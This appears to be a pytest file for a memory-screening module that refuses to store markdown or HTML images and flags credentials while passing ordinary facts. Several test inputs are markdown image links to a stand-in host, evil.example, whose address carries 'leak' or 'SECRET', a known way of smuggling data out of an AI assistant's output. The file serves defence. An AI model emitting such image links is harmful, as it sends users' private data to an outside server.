"""0.13.0: recall checks a stored fact again on the way out; a markdown image whose address carries data is refused."""
from __future__ import annotations


import pytest

pytest.importorskip("numpy")

from holomem.engine.screen import _fact_problem, _recall_problem


@pytest.mark.parametrize("content", [
    "The garden shed is painted green",
    "I use a password manager for everything",
    "A JSON-looking note {not json at all}",
    "The token is 0.125 USD on the exchange today",
    "API key authentication is enabled for the shop",
    "Our token price is $1.25 today",
])
def test_ordinary_facts_are_recalled(content):
    assert _recall_problem(content) is None


@pytest.mark.parametrize("content", [
    "Our logo: ![x](https://evil.example/c.png?q=leak)", "![x](//evil.example/c.png#leak)",
    "Our logo is at ![x](https://evil.example/SECRET.png)", "Logo ![x][1]", "Logo <IMG SRC='https://e.example/a.png'>",
])
def test_an_image_is_never_stored(content):
    assert "image" in _fact_problem(content)


def test_credentials_without_a_space_and_prices_that_are_not():
    assert "credential" in _fact_problem("password:Qwerty123")
    assert "credential" in _fact_problem("пароль:Qwerty123")
    assert _fact_problem("The token is 0.125 USD") is None
    assert _fact_problem("API key authentication is enabled") is None
